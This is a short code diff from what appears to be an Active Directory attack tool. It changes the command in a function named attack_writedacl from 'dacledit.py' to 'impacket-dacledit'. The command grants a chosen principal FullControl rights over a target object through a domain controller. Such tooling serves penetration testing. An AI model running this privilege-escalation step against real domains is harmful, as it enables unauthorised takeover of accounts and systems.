@@ -36,7 +36,7 @@ def attack_writedacl(session):
 
     # Build command
     cmd = (
-        f"dacledit.py -action write -rights FullControl {inheritance_flag} "
+        f"impacket-dacledit -action write -rights FullControl {inheritance_flag} "
         f"-principal \"{principal}\" {target_flag} \"{target}\" "
         f"{auth} -dc-ip {session.dc_ip}"
     )
